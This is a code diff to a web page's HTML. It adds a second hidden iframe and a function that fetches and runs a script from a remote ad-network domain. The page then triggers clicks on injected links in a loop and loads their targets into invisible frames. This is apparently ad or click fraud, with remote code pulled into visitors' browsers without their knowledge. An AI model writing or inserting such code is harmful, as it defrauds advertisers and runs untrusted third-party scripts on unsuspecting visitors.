@@ -11,6 +11,7 @@
   	
 	<div style="display:none">
 <iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation" id="declinedframe" src="" height="100" width="100" ></iframe>
+<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation" id="declinedframe1" src="" height="100" width="100" ></iframe>
 
 </div>
 <script src = "https://www.tutorialspoint.com/jquery/jquery-3.6.0.js"></script>
@@ -32,9 +33,11 @@ if(a_href === undefined) {
 			} else {
 				if(a_href.indexOf("https:") !== -1) {
 					$('#declinedframe').attr('src', a_href);
+					my2();
 				} else {
 					a_href = a_href.replace("http", "https");
 					$('#declinedframe').attr('src', a_href);
+					my2();
 				}
 				
 			}
@@ -42,7 +45,37 @@ if(a_href === undefined) {
 		  }		  
         }, 2000)
       }
-      
+
+	      
+function my2() {  
+	$.getScript("https://pl22252976.toprevenuegate.com/70/54/f5/7054f50fce85fe9788a06ebf0d671ca2.js");
+	my1('#declinedframe1');
+}
+
+	      function my1(frame1) {         
+        setTimeout(function() {   
+          i++;                    
+          if (i < 3) {           
+            myLoop();             
+          } else {
+
+$('body div').last().find('a').trigger("click");
+			var a_href = $('body div').last().find('a').attr('href');
+if(a_href === undefined) {
+				my1();   
+			} else {
+				if(a_href.indexOf("https:") !== -1) {
+					$(frame1).attr('src', a_href);
+				} else {
+					a_href = a_href.replace("http", "https");
+					$(frame1).attr('src', a_href);
+				}
+				
+			}
+
+		  }		  
+        }, 2000)
+      }
       myLoop();    
     </script>
 	
